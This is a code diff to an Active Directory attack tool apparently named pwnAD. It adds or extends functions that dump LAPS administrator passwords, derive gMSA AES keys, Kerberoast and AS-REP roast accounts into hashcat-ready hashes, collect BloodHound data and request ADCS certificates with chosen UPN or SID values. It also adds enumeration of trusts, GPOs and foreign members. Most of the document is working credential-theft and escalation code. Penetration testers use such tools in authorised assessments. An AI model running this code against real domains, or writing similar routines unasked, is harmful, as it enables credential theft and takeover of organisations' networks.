@@ -1,3 +1,6 @@
+from binascii import hexlify
+from impacket.krb5 import constants
+from impacket.krb5.crypto import string_to_key
 from impacket.ldap import ldaptypes
 from impacket.ldap.ldaptypes import ACE, ACCESS_ALLOWED_OBJECT_ACE, ACCESS_MASK, LDAP_SID, SR_SECURITY_DESCRIPTOR
 from ldap3.protocol.microsoft import security_descriptor_control
@@ -7,6 +10,8 @@ from ldap3 import BASE, SUBTREE
 from pyasn1.error import PyAsn1Error
 import ldap3
 import logging
+
+from Cryptodome.Hash import MD4
 
 from pwnAD.lib.accesscontrol import *
 from pwnAD.lib.logger import BLUE, BOLD, LIGHT_RED, RESET
@@ -112,7 +117,7 @@ def users_with_admin_count(conn):
     """List users with adminCount=1 (historically privileged accounts)."""
     query(conn, "(&(objectClass=user)(admincount=1)(!(samaccountname=krbtgt)))", "samaccountname", simple=True)
 
-def accounts_with_sid_histoy(conn):
+def accounts_with_sid_history(conn):
     """List accounts with SID History attribute set."""
     query(conn, "(&(objectCategory=Person)(objectClass=User)(sidHistory=*))", "samaccountname", simple=True) 
 
@@ -277,22 +282,61 @@ def machine_quota(conn):
         logging.error("MachineAccountQuota: <not set>")
 
 def laps(conn):
-    """Retrieve LAPS (Local Administrator Password Solution) passwords for computers."""
-    try:
-        conn.search(search_base=conn._baseDN, search_filter='(&(objectCategory=computer)(ms-MCS-AdmPwd=*))', attributes=["ms-Mcs-AdmPwd","SAMAccountname"])
-        results = conn._ldap_connection.entries
-        if results == []:
-            logging.info("No LAPS password have been found")
-        else :
-            logging.info("LAPS password(s) found :")
-            for result in results:
-                logging.info(f'{result["SAMAccountname"]} : {result["ms-MCS-AdmPwd"]}')
-    except ldap3.core.exceptions.LDAPException as e:
-        if e.args[0] == "invalid attribute type ms-Mcs-AdmPwd":
-            logging.error("This domain does not have LAPS configured")
-        else:
-            error_code = conn._ldap_connection.result['result']
-            check_error(conn, error_code, e)
+    """Retrieve LAPS (Local Administrator Password Solution) passwords for computers.
+
+    Supports both Legacy LAPS (ms-Mcs-AdmPwd) and Windows LAPS (msLAPS-Password,
+    msLAPS-EncryptedPassword). Each version is queried separately to avoid schema
+    errors on domains that only have one version deployed.
+    """
+    found_any = False
+
+    laps_versions = [
+        {
+            'name': 'Legacy LAPS',
+            'filter': '(&(objectCategory=computer)(ms-MCS-AdmPwd=*))',
+            'attrs': ['sAMAccountName', 'ms-Mcs-AdmPwd'],
+            'pwd_attr': 'ms-Mcs-AdmPwd',
+        },
+        {
+            'name': 'Windows LAPS',
+            'filter': '(&(objectCategory=computer)(|(msLAPS-Password=*)(msLAPS-EncryptedPassword=*)))',
+            'attrs': ['sAMAccountName', 'msLAPS-Password', 'msLAPS-EncryptedPassword'],
+            'pwd_attr': None,
+        },
+    ]
+
+    for ver in laps_versions:
+        try:
+            conn.search(search_base=conn._baseDN, search_filter=ver['filter'], attributes=ver['attrs'])
+            results = conn._ldap_connection.entries
+            if results:
+                found_any = True
+                logging.info(f"{ver['name']} password(s) found:")
+                for result in results:
+                    sam = result['sAMAccountName']
+                    if ver['pwd_attr']:
+                        logging.info(f'  {sam} : {result[ver["pwd_attr"]]}')
+                    else:
+                        pwd = result.get('msLAPS-Password', None)
+                        enc = result.get('msLAPS-EncryptedPassword', None)
+                        pwd_val = pwd.value if pwd and pwd.value else None
+                        enc_val = enc.value if enc and enc.value else None
+                        if pwd_val:
+                            logging.info(f'  {sam} : {pwd_val}')
+                        elif enc_val:
+                            logging.info(f'  {sam} : [encrypted] {enc_val}')
+                        else:
+                            logging.info(f'  {sam} : <present but empty>')
+        except ldap3.core.exceptions.LDAPException as e:
+            err_msg = str(e.args[0]) if e.args else str(e)
+            if 'invalid attribute type' in err_msg:
+                logging.debug(f"{ver['name']} schema not available on this domain")
+            else:
+                error_code = conn._ldap_connection.result['result']
+                check_error(conn, error_code, e)
+
+    if not found_any:
+        logging.info("No LAPS passwords found (neither Legacy nor Windows LAPS)")
 
 def gmsa(conn):
     """
@@ -349,7 +393,7 @@ def gmsa(conn):
 
                 # Compute aes keys
                 password = currentPassword.decode('utf-16-le', 'replace').encode('utf-8')
-                salt = f'{args.domain.upper()}host{sam[:-1].lower()}.{args.domain.lower()}'
+                salt = f'{conn.domain.upper()}host{sam[:-1].lower()}.{conn.domain.lower()}'
                 aes_128_hash = hexlify(string_to_key(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value, password, salt).contents)
                 aes_256_hash = hexlify(string_to_key(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value, password, salt).contents)
                 logging.info(f'{sam}:aes256-cts-hmac-sha1-96:{aes_256_hash.decode("utf-8")}')
@@ -1180,3 +1224,292 @@ def adcs(conn, vulnerable_only: bool = False, output: str = None, format: str = 
         import traceback
         traceback.print_exc()
 
+
+def trusts(conn):
+    """Enumerate domain trust relationships."""
+
+    TRUST_DIRECTION = {0: 'Disabled', 1: 'Inbound', 2: 'Outbound', 3: 'Bidirectional'}
+    TRUST_TYPE = {1: 'Downlevel (non-AD)', 2: 'Uplevel (AD)', 3: 'MIT (Kerberos)', 4: 'DCE'}
+    TRUST_ATTR_FLAGS = {
+        0x1: 'NON_TRANSITIVE', 0x2: 'UPLEVEL_ONLY', 0x4: 'QUARANTINED_DOMAIN',
+        0x8: 'FOREST_TRANSITIVE', 0x10: 'CROSS_ORGANIZATION', 0x20: 'WITHIN_FOREST',
+        0x40: 'TREAT_AS_EXTERNAL', 0x80: 'USES_RC4_ENCRYPTION',
+        0x200: 'USES_AES_KEYS', 0x400: 'CROSS_ORGANIZATION_NO_TGT_DELEGATION',
+        0x800: 'PIM_TRUST',
+    }
+
+    try:
+        conn._ldap_connection.search(
+            conn._baseDN,
+            '(objectClass=trustedDomain)',
+            attributes=['cn', 'trustDirection', 'trustType', 'trustAttributes',
+                        'flatName', 'trustPartner', 'securityIdentifier',
+                        'whenCreated', 'whenChanged'])
+        entries = conn._ldap_connection.entries
+        if not entries:
+            logging.info("No domain trusts found")
+            return
+
+        logging.info(f"Found {len(entries)} domain trust(s)\n")
+        for entry in entries:
+            name = entry['cn'].value if 'cn' in entry else '?'
+            partner = entry['trustPartner'].value if 'trustPartner' in entry else ''
+            flat = entry['flatName'].value if 'flatName' in entry else ''
+            direction_val = int(entry['trustDirection'].value) if 'trustDirection' in entry and entry['trustDirection'].value is not None else 0
+            ttype_val = int(entry['trustType'].value) if 'trustType' in entry and entry['trustType'].value is not None else 0
+            tattrs_val = int(entry['trustAttributes'].value) if 'trustAttributes' in entry and entry['trustAttributes'].value is not None else 0
+
+            direction = TRUST_DIRECTION.get(direction_val, f'Unknown ({direction_val})')
+            ttype = TRUST_TYPE.get(ttype_val, f'Unknown ({ttype_val})')
+            flags = [v for k, v in TRUST_ATTR_FLAGS.items() if tattrs_val & k]
+
+            print(f"{BOLD}{name}{RESET} ({partner})")
+            print(f"  Direction  : {direction}")
+            print(f"  Type       : {ttype}")
+            print(f"  NetBIOS    : {flat}")
+            if flags:
+                print(f"  Attributes : {', '.join(flags)}")
+            if tattrs_val & 0x4:
+                print(f"  {LIGHT_RED}[!] SID Filtering enabled (quarantined){RESET}")
+            print()
+    except Exception as e:
+        logging.error(f"Error enumerating trusts: {e}")
+
+
+def gpos(conn):
+    """Enumerate Group Policy Objects and their OU links."""
+    import re as _re
+
+    try:
+        conn._ldap_connection.search(
+            conn._baseDN,
+            '(objectClass=groupPolicyContainer)',
+            attributes=['displayName', 'cn', 'gPCFileSysPath', 'flags', 'whenCreated', 'whenChanged', 'distinguishedName'])
+        gpo_entries = conn._ldap_connection.entries
+        if not gpo_entries:
+            logging.info("No GPOs found")
+            return
+
+        gpo_map = {}
+        for entry in gpo_entries:
+            dn = entry.entry_dn
+            gpo_map[dn.lower()] = {
+                'name': entry['displayName'].value if 'displayName' in entry else '',
+                'guid': entry['cn'].value if 'cn' in entry else '',
+                'path': entry['gPCFileSysPath'].value if 'gPCFileSysPath' in entry else '',
+                'flags': int(entry['flags'].value) if 'flags' in entry and entry['flags'].value is not None else 0,
+                'dn': dn,
+                'links': [],
+            }
+
+        conn._ldap_connection.search(
+            conn._baseDN,
+            '(gPLink=*)',
+            attributes=['distinguishedName', 'gPLink', 'name'])
+        for entry in conn._ldap_connection.entries:
+            gplink = entry['gPLink'].value if 'gPLink' in entry else ''
+            ou_dn = entry.entry_dn
+            ou_name = entry['name'].value if 'name' in entry else ou_dn
+            if gplink:
+                for match in _re.finditer(r'\[LDAP://([^;]+);(\d+)\]', gplink, _re.IGNORECASE):
+                    linked_dn = match.group(1).lower()
+                    enforced = int(match.group(2)) & 2
+                    if linked_dn in gpo_map:
+                        gpo_map[linked_dn]['links'].append({
+                            'ou': ou_name, 'ou_dn': ou_dn, 'enforced': bool(enforced)
+                        })
+
+        logging.info(f"Found {len(gpo_entries)} GPO(s)\n")
+        for gpo in gpo_map.values():
+            status = 'Disabled' if gpo['flags'] == 3 else 'User disabled' if gpo['flags'] == 1 else 'Computer disabled' if gpo['flags'] == 2 else 'Enabled'
+            print(f"{BOLD}{gpo['name']}{RESET}  [{gpo['guid']}]")
+            print(f"  Status : {status}")
+            if gpo['path']:
+                print(f"  Path   : {gpo['path']}")
+            if gpo['links']:
+                links_str = ', '.join(
+                    f"{l['ou']}{'(enforced)' if l['enforced'] else ''}" for l in gpo['links']
+                )
+                print(f"  Links  : {links_str}")
+            else:
+                print(f"  Links  : (none)")
+            print()
+    except Exception as e:
+        logging.error(f"Error enumerating GPOs: {e}")
+
+
+def foreign_members(conn):
+    """Enumerate foreign security principals and cross-domain group members."""
+    try:
+        foreign_users = []
+        conn._ldap_connection.search(
+            f"CN=ForeignSecurityPrincipals,{conn._baseDN}",
+            '(objectClass=foreignSecurityPrincipal)',
+            attributes=['objectSid', 'distinguishedName', 'memberOf'])
+
+        domain_sid = conn.get_domain_sid()
+
+        for entry in conn._ldap_connection.entries:
+            sid = entry['objectSid'].value if 'objectSid' in entry else ''
+            if not sid or (domain_sid and sid.startswith(domain_sid)):
+                continue
+            member_of = entry['memberOf'].values if 'memberOf' in entry and entry['memberOf'].value else []
+            foreign_users.append({'sid': sid, 'dn': entry.entry_dn, 'member_of': member_of})
+
+        cross_domain = []
+        conn._ldap_connection.search(
+            conn._baseDN,
+            '(&(objectClass=group)(member=*))',
+            attributes=['sAMAccountName', 'distinguishedName', 'member'])
+        base_dn_lower = conn._baseDN.lower()
+        for entry in conn._ldap_connection.entries:
+            members = entry['member'].values if 'member' in entry and entry['member'].value else []
+            group_name = entry['sAMAccountName'].value if 'sAMAccountName' in entry else entry.entry_dn
+            for member_dn in members:
+                if not member_dn.lower().endswith(base_dn_lower):
+                    cross_domain.append({'group': group_name, 'group_dn': entry.entry_dn, 'member_dn': member_dn})
+
+        if not foreign_users and not cross_domain:
+            logging.info("No foreign security principals or cross-domain members found")
+            return
+
+        if foreign_users:
+            logging.info(f"Foreign Security Principals ({len(foreign_users)}):\n")
+            for f in foreign_users:
+                print(f"  SID: {BLUE}{f['sid']}{RESET}")
+                if f['member_of']:
+                    groups = [dn.split(',')[0].replace('CN=', '') for dn in f['member_of']]
+                    print(f"    Member of: {', '.join(groups)}")
+                print()
+
+        if cross_domain:
+            logging.info(f"Cross-Domain Group Members ({len(cross_domain)}):\n")
+            for m in cross_domain:
+                print(f"  Group: {BLUE}{m['group']}{RESET}")
+                print(f"    External member: {m['member_dn']}")
+                print()
+
+    except Exception as e:
+        logging.error(f"Error enumerating foreign members: {e}")
+
+
+def kerberoast(conn, target=None):
+    """Request TGS hashes for kerberoastable accounts (hashcat-compatible output).
+
+    Without target, automatically discovers and roasts all kerberoastable users.
+    The TGT is requested once and reused for all targets.
+    """
+    try:
+        from pwnAD.lib.kerberos import kerberoast_account, _get_tgt
+
+        if target:
+            escaped = escape_filter_chars(target)
+            ldap_filter = f'(&(sAMAccountName={escaped})(servicePrincipalName=*))'
+        else:
+            ldap_filter = '(&(samAccountType=805306368)(servicePrincipalName=*)(!(samAccountName=krbtgt))(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'
+
+        conn._ldap_connection.search(conn._baseDN, ldap_filter, attributes=['sAMAccountName', 'servicePrincipalName'])
+        if not conn._ldap_connection.entries:
+            if target:
+                logging.error(f"No SPN found for {target}")
+            else:
+                logging.info("No kerberoastable accounts found")
+            return
+
+        targets = []
+        for entry in conn._ldap_connection.entries:
+            sam = entry['sAMAccountName'].value
+            spns = entry['servicePrincipalName'].values
+            if spns:
+                spn = spns[0] if isinstance(spns, list) else spns
+                targets.append((sam, spn))
+
+        if not targets:
+            logging.info("No kerberoastable accounts found")
+            return
+
+        logging.info(f"Roasting {len(targets)} account(s)...")
+        tgt_data = _get_tgt(conn)
+
+        for sam, spn in targets:
+            try:
+                print(kerberoast_account(conn, sam, spn, tgt_data=tgt_data))
+            except Exception as e:
+                logging.error(f"Failed to roast {sam}: {e}")
+
+    except Exception as e:
+        logging.error(f"Kerberoast error: {e}")
+
+
+def asreproast(conn, target=None):
+    """Request AS-REP hashes for accounts without Kerberos pre-auth (hashcat-compatible output).
+
+    Without target, automatically discovers and roasts all AS-REP roastable users.
+    """
+    try:
+        from pwnAD.lib.kerberos import asreproast_account
+
+        if target:
+            targets = [target]
+        else:
+            conn._ldap_connection.search(
+                conn._baseDN,
+                '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))',
+                attributes=['sAMAccountName'])
+            if not conn._ldap_connection.entries:
+                logging.info("No AS-REP roastable accounts found")
+                return
+            targets = [e['sAMAccountName'].value for e in conn._ldap_connection.entries]
+
+        logging.info(f"Roasting {len(targets)} account(s)...")
+
+        for acct in targets:
+            try:
+                print(asreproast_account(conn, acct))
+            except Exception as e:
+                logging.error(f"Failed to roast {acct}: {e}")
+
+    except Exception as e:
+        logging.error(f"AS-REP Roast error: {e}")
+
+
+def bloodhound(conn, output_dir='.', prefix='', collect=None, workers=10,
+               nameserver=None, exclude_dcs=False):
+    """Export domain data to BloodHound CE format via bloodhound-ce."""
+    try:
+        from pwnAD.lib.bloodhound import _run_collection, COLLECT_ALL
+        from bloodhound import resolve_collection_methods
+
+        if collect is None:
+            methods = COLLECT_ALL
+        else:
+            methods = resolve_collection_methods(collect)
+            if not methods:
+                logging.error(f"Invalid collection method: {collect}")
+                return
+
+        zip_path = _run_collection(
+            conn, output_dir=output_dir, prefix=prefix,
+            collect=methods, num_workers=workers, exclude_dcs=exclude_dcs,
+            nameserver=nameserver,
+        )
+        print(f"\n[+] BloodHound CE export saved to: {zip_path}")
+    except ImportError:
+        logging.error("bloodhound-ce package not installed. Run: pip install bloodhound-ce")
+    except Exception as e:
+        logging.error(f"BloodHound export error: {e}")
+
+
+def adcs_req(conn, ca_name, template, upn=None, dns=None, sid=None,
+             subject=None, ca_host=None, key_size=2048, output=None):
+    """Request a certificate from ADCS via MS-ICPR RPC."""
+    try:
+        from pwnAD.lib.certreq import request_certificate
+        pfx_path, cert, key = request_certificate(
+            conn, ca_name=ca_name, template=template,
+            ca_host=ca_host, upn=upn, dns=dns, sid=sid,
+            subject=subject, key_size=key_size, output=output,
+        )
+        print(f"\n[+] Certificate saved to: {pfx_path}")
+    except Exception as e:
+        logging.error(f"ADCS request error: {e}")
